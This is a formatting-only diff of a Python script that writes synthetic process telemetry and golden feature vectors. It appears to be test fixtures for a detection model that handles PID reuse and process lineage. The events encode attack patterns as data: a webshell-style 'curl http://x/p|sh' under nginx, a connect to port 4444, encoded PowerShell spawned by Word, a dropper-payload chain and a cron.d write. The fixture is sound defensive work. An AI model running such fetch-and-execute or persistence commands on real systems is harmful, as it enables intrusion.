@@ -86,29 +86,73 @@ O_WRONLY_CREAT = 0o101
 
 EVENTS = [
     # A webshell-shaped chain: web server parent, spawn + connect + file write.
-    exec_ev(100, 50, 1 * S, "sh", "/bin/sh", ["sh", "-c", "id; curl http://x/p|sh"],
-            parent=("nginx", "/usr/sbin/nginx"), generation=1),
+    exec_ev(
+        100,
+        50,
+        1 * S,
+        "sh",
+        "/bin/sh",
+        ["sh", "-c", "id; curl http://x/p|sh"],
+        parent=("nginx", "/usr/sbin/nginx"),
+        generation=1,
+    ),
     connect_ev(100, 50, 2 * S, "sh", "203.0.113.7", 4444, generation=1),
     file_open_ev(100, 50, 3 * S, "sh", "/tmp/p", O_WRONLY_CREAT, generation=1),
     # The same pid recycled: a quiet `ls` under bash. Its first life connected out and
     # wrote a file; none of that may reach this incarnation.
-    exec_ev(100, 60, 10 * S, "ls", "/usr/bin/ls", ["ls", "-la"],
-            parent=("bash", "/usr/bin/bash"), generation=2),
+    exec_ev(
+        100,
+        60,
+        10 * S,
+        "ls",
+        "/usr/bin/ls",
+        ["ls", "-la"],
+        parent=("bash", "/usr/bin/bash"),
+        generation=2,
+    ),
     # No generation stamps anywhere (an older sensor): pid-only behavior.
-    exec_ev(200, 1, 11 * S, "cat", "/usr/bin/cat", ["cat", "/etc/hostname"],
-            parent=("systemd", "/usr/lib/systemd/systemd")),
+    exec_ev(
+        200,
+        1,
+        11 * S,
+        "cat",
+        "/usr/bin/cat",
+        ["cat", "/etc/hostname"],
+        parent=("systemd", "/usr/lib/systemd/systemd"),
+    ),
     # No lineage at all (a sensor without parent tracking).
     exec_ev(300, 1, 12 * S, "whoami", "/usr/bin/whoami", ["whoami"]),
     # Windows-style exec: no argv, the flat cmdline is what the model reads.
-    exec_ev(400, 1, 13 * S, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-            [], parent=("winword.exe", "C:\\Program Files\\Microsoft Office\\winword.exe"),
-            cmdline="powershell.exe -enc SQBFAFgA"),
+    exec_ev(
+        400,
+        1,
+        13 * S,
+        "powershell.exe",
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        [],
+        parent=("winword.exe", "C:\\Program Files\\Microsoft Office\\winword.exe"),
+        cmdline="powershell.exe -enc SQBFAFgA",
+    ),
     connect_ev(400, 1, 14 * S, "powershell.exe", "198.51.100.9", 443),
     # Two execs in one incarnation: the later one supplies cmdline and lineage.
-    exec_ev(500, 1, 15 * S, "dropper", "/tmp/dropper", ["/tmp/dropper"],
-            parent=("bash", "/usr/bin/bash")),
-    exec_ev(500, 1, 16 * S, "payload", "/dev/shm/payload", ["/dev/shm/payload", "--run"],
-            parent=("dropper", "/tmp/dropper")),
+    exec_ev(
+        500,
+        1,
+        15 * S,
+        "dropper",
+        "/tmp/dropper",
+        ["/tmp/dropper"],
+        parent=("bash", "/usr/bin/bash"),
+    ),
+    exec_ev(
+        500,
+        1,
+        16 * S,
+        "payload",
+        "/dev/shm/payload",
+        ["/dev/shm/payload", "--run"],
+        parent=("dropper", "/tmp/dropper"),
+    ),
     file_open_ev(500, 1, 17 * S, "payload", "/etc/cron.d/x", O_WRONLY_CREAT),
 ]
 
@@ -127,7 +171,9 @@ rows = [
 golden_path = OUT / "t1_golden.jsonl"
 golden_path.write_text("".join(json.dumps(r) + "\n" for r in rows), encoding="utf-8")
 
-print(f"wrote {events_path.name} ({len(EVENTS)} events) and {golden_path.name} "
-      f"({len(rows)} incarnation vectors)")
+print(
+    f"wrote {events_path.name} ({len(EVENTS)} events) and {golden_path.name} "
+    f"({len(rows)} incarnation vectors)"
+)
 for r in rows:
     print(f"  pid={r['pid']:<4} gen={r['process_generation']!s:<4} {r['features']}")
